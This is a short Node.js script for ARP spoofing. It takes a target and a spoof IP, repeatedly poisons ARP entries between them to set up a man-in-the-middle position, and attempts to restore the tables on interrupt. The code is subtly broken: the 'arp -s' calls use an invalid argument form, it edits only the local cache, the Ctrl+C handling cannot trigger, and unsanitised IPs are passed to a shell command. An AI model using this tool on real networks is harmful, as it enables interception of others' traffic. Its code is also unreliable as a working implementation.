const arp = require('arpjs');
const { execSync } = require('child_process');
const arg = require('arg');

const getArguments = () => {
    const args = arg({
        '--target': String,
        '--spoof': String
    });
    if (!args['--target']) {
        console.error('[-] Please specify target IP, use --help for usage');
        process.exit(1);
    } else if (!args['--spoof']) {
        console.error('[-] Please specify spoof IP, use --help for usage');
        process.exit(1);
    }
    return args;
}

const getMac = async (ip) => {
    try {
        const mac = await arp.getMAC(ip);
        return mac;
    } catch (error) {
        console.error(`[-] Error getting MAC for IP ${ip}: ${error}`);
        process.exit(1);
    }
}

const restore = async (targetIp, spoofIp) => {
    try {
        const targetMac = await getMac(targetIp);
        const spoofMac = await getMac(spoofIp);
        execSync(`arp -s ${targetIp} ${targetMac}`);
        execSync(`arp -s ${spoofIp} ${spoofMac}`);
    } catch (error) {
        console.error(`[-] Error restoring ARP tables: ${error}`);
        process.exit(1);
    }
}

const spoof = async (targetIp, spoofIp) => {
    try {
        const targetMac = await getMac(targetIp);
        execSync(`arp -s ${targetIp} ${spoofIp} ${targetMac}`);
    } catch (error) {
        console.error(`[-] Error spoofing ARP packets: ${error}`);
        process.exit(1);
    }
}

const main = async () => {
    const args = getArguments();
    let sentPackets = 0;
    try {
        while (true) {
            await spoof(args['--target'], args['--spoof']);
            await spoof(args['--spoof'], args['--target']);
            sentPackets += 2;
            console.log(`\r[+] Sent packets: ${sentPackets}`);
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
    } catch (error) {
        if (error.message === 'SIGINT') {
            console.log('\n[-] Ctrl + C detected.....Restoring ARP Tables Please Wait!');
            await restore(args['--target'], args['--spoof']);
        } else {
            console.error(`[-] Error: ${error}`);
            process.exit(1);
        }
    }
}

main();
